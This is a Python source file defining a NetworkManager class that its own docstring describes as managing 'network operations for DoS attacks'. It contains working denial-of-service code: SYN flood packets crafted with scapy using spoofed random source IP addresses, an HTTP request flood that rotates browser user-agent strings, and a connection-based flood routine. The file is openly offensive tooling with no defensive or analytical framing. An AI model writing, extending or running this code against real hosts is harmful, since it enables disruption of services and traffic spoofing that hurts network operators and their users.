import socket
import random
import time
from typing import Tuple, Optional
import requests
from scapy.all import IP, TCP, UDP, send
from concurrent.futures import ThreadPoolExecutor

class NetworkManager:
    """Class to manage network operations for DoS attacks."""
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        ]

    def create_socket(self) -> Optional[socket.socket]:
        """Create and return a TCP socket"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            return s
        except socket.error:
            return None

    def generate_ip(self) -> str:
        """Generate a random IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def craft_tcp_packet(self, target: Tuple[str, int]) -> IP:
        """Create a TCP packet with random source IP"""
        src_ip = self.generate_ip()
        packet = IP(src=src_ip, dst=target[0])/TCP(sport=random.randint(1024,65535), dport=target[1], flags="S")
        return packet

    def send_tcp_flood(self, target: Tuple[str, int], count: int = 1) -> None:
        """Send TCP flood packets"""
        packet = self.craft_tcp_packet(target)
        send(packet, count=count, verbose=False)

    def http_flood(self, url: str) -> None:
        """Send HTTP flood requests"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Cache-Control': 'no-cache',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        }
        
        try:
            requests.get(url, headers=headers, timeout=4)
        except:
            pass

    def syn_flood(self, target: Tuple[str, int]) -> None:
        """Perform SYN flood attack"""
        s = self.create_socket()
        if not s:
            return
            
        try:
            s.connect(target)
        except:
            pass
        finally:
            s.close()
